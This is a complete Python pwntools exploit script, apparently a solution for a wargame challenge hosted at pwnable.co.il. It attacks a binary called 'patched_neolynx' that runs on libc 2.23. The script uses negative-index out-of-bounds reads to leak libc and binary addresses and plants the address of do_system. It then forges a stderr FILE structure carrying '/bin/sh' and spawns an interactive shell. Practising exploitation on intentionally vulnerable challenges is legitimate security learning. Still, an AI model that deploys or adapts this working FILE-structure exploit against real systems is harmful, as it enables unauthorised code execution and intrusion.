#!/usr/bin/env python3 
from pwn import * 

context.binary = elf = ELF('./patched_neolynx')
context.log_level = 'DEBUG'
libc = ELF('./libc-2.23.so')


if args['REMOTE']:
    io = remote('pwnable.co.il', 9012)
else: 
    io = process([elf.path])
    gdb.attach(io)
    

def leak_address(index): 
    global io
    io.recvuntil(b'Exit\n')
    io.sendline(b'2')
    io.sendline(str(index).encode())
    io.recvuntil(b'rity: ')
    
    return int(io.recvuntil(b'\n').strip())

# Send name
io.sendline(b'd')

# Leak libc 
leaked_fwrite = leak_address(-12)
libc.address = leaked_fwrite - libc.sym['fwrite']
system_address = libc.sym['do_system']

io.sendline(b'3')
io.recvuntil(b'Name: ')
io.sendline(p64(system_address))

# Leak binary
leaked_binary = leak_address(-8)
name_variable_address = leaked_binary + int(16 * 5.5)

# Forge stderr FILE 
payload = flat(b'/bin/sh\x00',
                b'\x00' * (288 - 160), 
                p64(libc.sym['_IO_stdfile_2_lock']), 
                b'\x00' * (0xd8 - (9 * 16)), 
                name_variable_address - 0x38)

payload_size = len(payload)


io.sendline(b'1')
io.sendline(b'-4')
io.sendline(f'{str(payload_size)}'.encode())
io.sendline(payload)

io.interactive()

